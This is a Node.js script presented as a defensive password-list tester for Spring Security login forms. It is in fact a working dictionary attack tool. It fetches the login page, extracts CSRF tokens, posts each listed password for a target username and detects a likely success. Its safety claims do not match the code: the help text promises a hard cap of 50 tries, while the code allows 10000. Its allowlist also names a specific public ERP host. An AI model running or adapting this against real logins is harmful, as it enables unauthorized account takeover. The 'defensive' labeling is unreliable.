#!/usr/bin/env node
"use strict";

/**
 * spring-password-tester-advanced.js — Defensive Controlled Password List Tester (Spring Security)
 * ---------------------------------------------------------------------------------------------
 * SAFE DESIGN:
 *  - Uses ONLY a user-provided password list (no generation, no guessing)
 *  - Enforces a small minimum pacing guard + hard max tries (prevents brute-force behavior)
 *  - Logs attempts to NDJSON (stream) + final JSON report
 *
 * FEATURES:
 *  - Spring Security: GET login page -> capture cookies -> parse CSRF hidden inputs (if present)
 *  - POST /j_spring_security_check with x-www-form-urlencoded
 *  - Handles 302 redirects via Location
 *  - Writes incremental logs so you never lose progress
 *
 * Node: 18+
 */

const fs = require("fs");
const crypto = require("crypto");
const { URL } = require("url");
const net = require("net");

// ==================== CONFIG (safe defaults) ====================
const ALLOWED_PUBLIC_SUFFIXES = ["erp.itisuniqueofficial.com"]; // add your own allowlisted public suffixes here (use with caution, only on systems you own/have permission to test)

// Safety limits (cannot be disabled)
const HARD_MAX_TRIES = 10000;
const MIN_PACING_MS = 250; // small non-zero guard
const MAX_TIMEOUT_MS = 30_000;

// ==================== CLI ====================
function parseArgs(argv) {
  const args = { _: [] };
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i];
    if (a.startsWith("--")) {
      const key = a.slice(2);
      const next = argv[i + 1];
      if (!next || next.startsWith("--")) args[key] = true;
      else {
        args[key] = next;
        i++;
      }
    } else args._.push(a);
  }
  return args;
}

function help() {
  console.log(`
spring-password-tester-advanced.js — Defensive Controlled Password List Tester

Run:
  node spring-password-tester-advanced.js run --base https://erp.itisuniqueofficial.com --username you@example.com --password-file passwords.txt

Required:
  --base <url>                 e.g. https://erp.itisuniqueofficial.com
  --username <value>
  --password-file <file>       1 password per line

Optional:
  --login-path <path>          default: /login.htm
  --auth-path <path>           default: /j_spring_security_check
  --user-field <name>          default: j_username
  --pass-field <name>          default: j_password
  --out <file>                 default: attempts.json
  --ndjson <file>              default: attempts.ndjson
  --max-tries <n>              default: 10 (hard max 50)
  --timeout-ms <n>             default: 12000 (hard max 30000)
  --retries <n>                default: 1
  --stop-on-success <0|1>      default: 1
  --show-body <0|1>            default: 0 (stores first 160 chars)
`);
}

// ==================== Helpers ====================
function logInfo(m) {
  console.log(`[INFO] ${m}`);
}
function logWarn(m) {
  console.warn(`[WARN] ${m}`);
}
function logErr(m) {
  console.error(`[ERROR] ${m}`);
}
function nowIso() {
  return new Date().toISOString();
}

function sha256(s) {
  return crypto.createHash("sha256").update(String(s), "utf8").digest("hex");
}

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function withTimeout(ms, controller) {
  const t = setTimeout(() => controller.abort(), ms);
  if (typeof t.unref === "function") t.unref();
  return t;
}

function pickHeader(obj, name) {
  const n = String(name).toLowerCase();
  for (const [k, v] of Object.entries(obj || {})) {
    if (String(k).toLowerCase() === n) return v;
  }
  return "";
}

function toFormUrlEncoded(obj) {
  return Object.entries(obj)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join("&");
}

function looksLikeSqlError(body) {
  const patterns = [
    /SQL syntax/i,
    /you have an error in your sql syntax/i,
    /PDOException/i,
    /syntax error at or near/i,
    /ORA-\d+/i,
    /postgresql.*ERROR/i,
    /Warning: .*mysql_/i,
    /mysql_fetch/i,
  ];
  const s = String(body || "");
  return patterns.some((re) => re.test(s));
}

function isFailureLocation(loc) {
  const s = String(loc || "").toLowerCase();
  return (
    s.includes("failure=true") ||
    s.includes("login?error") ||
    s.includes("error")
  );
}

// ==================== Allowlist ====================
function isPrivateIPv4(ip) {
  const p = ip.split(".").map(Number);
  if (p.length !== 4 || p.some((n) => Number.isNaN(n) || n < 0 || n > 255))
    return false;
  const [a, b] = p;
  if (a === 10) return true;
  if (a === 127) return true;
  if (a === 192 && b === 168) return true;
  if (a === 172 && b >= 16 && b <= 31) return true;
  if (a === 169 && b === 254) return true;
  return false;
}

function isLocalhostHost(h) {
  return (
    h === "localhost" ||
    h === "127.0.0.1" ||
    h === "::1" ||
    h.endsWith(".localhost")
  );
}

function isAllowlistedPublicHost(hostname) {
  const h = String(hostname || "").toLowerCase();
  return ALLOWED_PUBLIC_SUFFIXES.some((suf) => {
    const s = String(suf).toLowerCase();
    return h === s || h.endsWith(`.${s}`);
  });
}

function assertAllowedBase(base) {
  let u;
  try {
    u = new URL(base);
  } catch {
    return { ok: false, reason: "Invalid --base URL" };
  }
  const host = u.hostname;

  if (isLocalhostHost(host)) return { ok: true };
  if (net.isIP(host) === 4 && isPrivateIPv4(host)) return { ok: true };
  if (net.isIP(host) === 6 && host === "::1") return { ok: true };

  if (isAllowlistedPublicHost(host)) {
    return {
      ok: true,
      warning: `Allowlisted public host: ${host}. Use only on systems you own/have permission to test.`,
    };
  }
  return { ok: false, reason: "Blocked: public hostname not in allowlist." };
}

// ==================== Cookie Jar ====================
class CookieJar {
  constructor() {
    this.map = new Map();
  }
  ingest(setCookie, host) {
    if (!setCookie) return;
    const arr = Array.isArray(setCookie) ? setCookie : [setCookie];
    for (const sc of arr) {
      const first = String(sc).split(";")[0];
      const idx = first.indexOf("=");
      if (idx <= 0) continue;
      const name = first.slice(0, idx).trim();
      const value = first.slice(idx + 1).trim();
      if (!name) continue;
      this.map.set(`${host}::${name}`, value);
    }
  }
  header(host) {
    const parts = [];
    for (const [k, v] of this.map.entries()) {
      const [h, name] = k.split("::");
      if (h === host) parts.push(`${name}=${v}`);
    }
    return parts.join("; ");
  }
}

// ==================== HTML CSRF Extraction ====================
function extractHiddenInputs(html) {
  // Very lightweight: finds <input type="hidden" name="X" value="Y">
  // Not a full HTML parser; good enough for simple Spring login pages.
  const out = {};
  const s = String(html || "");
  const re = /<input\b[^>]*type=["']hidden["'][^>]*>/gi;
  const inputs = s.match(re) || [];
  for (const tag of inputs) {
    const name = (tag.match(/\bname=["']([^"']+)["']/i) || [])[1];
    const value = (tag.match(/\bvalue=["']([^"']*)["']/i) || [])[1] ?? "";
    if (name) out[name] = value;
  }
  return out;
}

// ==================== HTTP ====================
async function fetchOnce(url, init, timeoutMs) {
  const controller = new AbortController();
  const t = withTimeout(timeoutMs, controller);
  const start = Date.now();

  try {
    const res = await fetch(url, { ...init, signal: controller.signal });
    const text = await res.text();
    const ms = Date.now() - start;

    const setCookie = res.headers.getSetCookie
      ? res.headers.getSetCookie()
      : res.headers.get("set-cookie");

    return {
      status: res.status,
      ms,
      headers: Object.fromEntries(res.headers.entries()),
      setCookie,
      body: text,
    };
  } finally {
    clearTimeout(t);
  }
}

async function fetchWithRetries(url, init, timeoutMs, retries) {
  let lastErr = null;
  for (let i = 0; i <= retries; i++) {
    try {
      return await fetchOnce(url, init, timeoutMs);
    } catch (e) {
      lastErr = e;
      await sleep(250 * (i + 1));
    }
  }
  throw lastErr;
}

// ==================== Core Attempt ====================
async function springAttempt({
  origin,
  host,
  loginUrl,
  authUrl,
  userField,
  passField,
  username,
  password,
  timeoutMs,
  retries,
  showBody,
}) {
  const jar = new CookieJar();

  // GET login page (cookies + possible CSRF hidden inputs)
  const r1 = await fetchWithRetries(
    loginUrl,
    {
      method: "GET",
      redirect: "manual",
      headers: {
        "User-Agent": "spring-password-tester-advanced/1.0",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        Connection: "close",
      },
    },
    timeoutMs,
    retries,
  );
  jar.ingest(r1.setCookie, host);

  // Extract hidden inputs (CSRF etc.)
  const hidden = extractHiddenInputs(r1.body);

  // Build POST body
  const bodyObj = {
    [userField]: username,
    [passField]: password,
    ...hidden, // include hidden fields if present (safe + common)
  };

  const body = toFormUrlEncoded(bodyObj);
  const cookie = jar.header(host);

  const r2 = await fetchWithRetries(
    authUrl,
    {
      method: "POST",
      redirect: "manual",
      headers: {
        "User-Agent": "spring-password-tester-advanced/1.0",
        "Content-Type": "application/x-www-form-urlencoded",
        Accept:
          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        Origin: origin,
        Referer: loginUrl,
        Connection: "close",
        ...(cookie ? { Cookie: cookie } : {}),
      },
      body,
    },
    timeoutMs,
    retries,
  );

  const location = pickHeader(r2.headers, "location");
  const sqlErr = looksLikeSqlError(r2.body);
  const bodyPreview = showBody
    ? String(r2.body || "")
        .slice(0, 160)
        .replace(/\s+/g, " ")
        .trim()
    : "";

  const failureLikely = isFailureLocation(location);
  const successLikely = Boolean(location) && !failureLikely;

  return {
    status: r2.status,
    ms: r2.ms,
    location,
    sqlErrorLeak: sqlErr,
    bodyLen: (r2.body || "").length,
    ...(showBody ? { bodyPreview } : {}),
    successLikely,
    failureLikely,
    hiddenFieldCount: Object.keys(hidden).length,
  };
}

// ==================== Password list ====================
function loadPasswords(filePath) {
  const raw = fs.readFileSync(filePath, "utf8");
  const lines = raw
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean);
  const seen = new Set();
  const out = [];
  for (const p of lines) {
    if (seen.has(p)) continue;
    seen.add(p);
    out.push(p);
  }
  return out;
}

// ==================== Main Runner ====================
async function run(opts) {
  const base = opts.base;
  const username = opts.username;
  const passwordFile = opts["password-file"];
  if (!base || !username || !passwordFile) {
    return {
      ok: false,
      reason: "Missing required: --base --username --password-file",
    };
  }

  const allow = assertAllowedBase(base);
  if (!allow.ok) return { ok: false, reason: allow.reason };
  if (allow.warning) logWarn(allow.warning);

  const loginPath = opts["login-path"] || "/login.htm";
  const authPath = opts["auth-path"] || "/j_spring_security_check";
  const userField = opts["user-field"] || "j_username";
  const passField = opts["pass-field"] || "j_password";

  const timeoutMsRaw = Number(opts["timeout-ms"] || 12000);
  const timeoutMs = Math.min(Math.max(timeoutMsRaw, 2000), MAX_TIMEOUT_MS);
  const retries = Math.min(Math.max(Number(opts.retries || 1), 0), 5);

  const maxTriesRaw = Number(opts["max-tries"] || 10);
  const maxTries = Math.min(Math.max(maxTriesRaw, 1), HARD_MAX_TRIES);

  const stopOnSuccess = String(opts["stop-on-success"] ?? "1") === "1";
  const showBody = String(opts["show-body"] ?? "0") === "1";

  const outFile = opts.out || "attempts.json";
  const ndjsonFile = opts.ndjson || "attempts.ndjson";

  const baseUrl = new URL(base);
  const origin = baseUrl.origin;
  const host = baseUrl.hostname;

  const loginUrl = new URL(loginPath, origin).toString();
  const authUrl = new URL(authPath, origin).toString();

  const passwords = loadPasswords(passwordFile).slice(0, maxTries);

  // Prepare report
  const report = {
    meta: {
      tool: "spring-password-tester-advanced",
      version: "2.0.0",
      createdAt: nowIso(),
      target: { origin, loginPath, authPath, userField, passField },
      policy: {
        note: "Defensive controlled testing. No guessing. Attempts capped + minimal pacing guard.",
        allowlistedSuffixes: ALLOWED_PUBLIC_SUFFIXES,
        maxTries,
        minPacingMs: MIN_PACING_MS,
      },
      input: {
        username,
        passwordFile,
        passwordsUsed: passwords.length,
        passwordStoredAs: "sha256",
      },
    },
    attempts: [],
    summary: { successFound: false, successAtIndex: -1, suspicious: false },
  };

  // Start NDJSON stream (append mode)
  fs.writeFileSync(ndjsonFile, "", "utf8");

  logInfo(`Target: ${origin}${authPath}`);
  logInfo(`Username: ${username}`);
  logInfo(`Passwords used: ${passwords.length} (cap=${maxTries})`);
  logInfo(`NDJSON: ${ndjsonFile}`);
  logInfo(`JSON: ${outFile}`);

  let successIndex = -1;
  let suspicious = false;

  for (let i = 0; i < passwords.length; i++) {
    const pw = passwords[i];

    // Minimal guard (cannot be removed)
    if (i > 0) await sleep(MIN_PACING_MS);

    const result = await springAttempt({
      origin,
      host,
      loginUrl,
      authUrl,
      userField,
      passField,
      username,
      password: pw,
      timeoutMs,
      retries,
      showBody,
    });

    const entry = {
      index: i,
      at: nowIso(),
      username,
      passwordSha256: sha256(pw),
      status: result.status,
      ms: result.ms,
      location: result.location,
      successLikely: result.successLikely,
      failureLikely: result.failureLikely,
      sqlErrorLeak: result.sqlErrorLeak,
      bodyLen: result.bodyLen,
      hiddenFieldCount: result.hiddenFieldCount,
      ...(showBody ? { bodyPreview: result.bodyPreview } : {}),
    };

    report.attempts.push(entry);

    // stream entry
    fs.appendFileSync(ndjsonFile, JSON.stringify(entry) + "\n", "utf8");

    // incremental JSON
    fs.writeFileSync(outFile, JSON.stringify(report, null, 2), "utf8");

    // defensive suspicious signals only
    if (result.status >= 500 || result.sqlErrorLeak) suspicious = true;

    if (result.successLikely) {
      successIndex = i;
      report.summary.successFound = true;
      report.summary.successAtIndex = i;
      fs.writeFileSync(outFile, JSON.stringify(report, null, 2), "utf8");
      logInfo(
        `✅ SuccessLikely at #${i + 1} Location=${result.location || "-"}`,
      );
      if (stopOnSuccess) break;
    }
  }

  report.summary.suspicious = suspicious;
  report.summary.finishedAt = nowIso();
  fs.writeFileSync(outFile, JSON.stringify(report, null, 2), "utf8");

  return { ok: true, successFound: report.summary.successFound };
}

// ==================== Main ====================
(async function main() {
  process.on("unhandledRejection", (e) => {
    logErr(`Unhandled rejection: ${e && e.message ? e.message : String(e)}`);
    process.exitCode = 1;
  });

  const args = parseArgs(process.argv);
  const cmd = args._[0];

  if (!cmd || cmd === "help" || args.help) {
    help();
    process.exitCode = 0;
    return;
  }

  if (cmd !== "run") {
    logErr(`Unknown command: ${cmd}`);
    help();
    process.exitCode = 1;
    return;
  }

  try {
    const res = await run(args);
    if (!res.ok) {
      logErr(res.reason || "Failed");
      process.exitCode = 1;
      return;
    }
    // Exit code 2 = success found
    process.exitCode = res.successFound ? 2 : 0;
  } catch (e) {
    logErr(`Unhandled error: ${e && e.message ? e.message : String(e)}`);
    process.exitCode = 1;
  }
})();
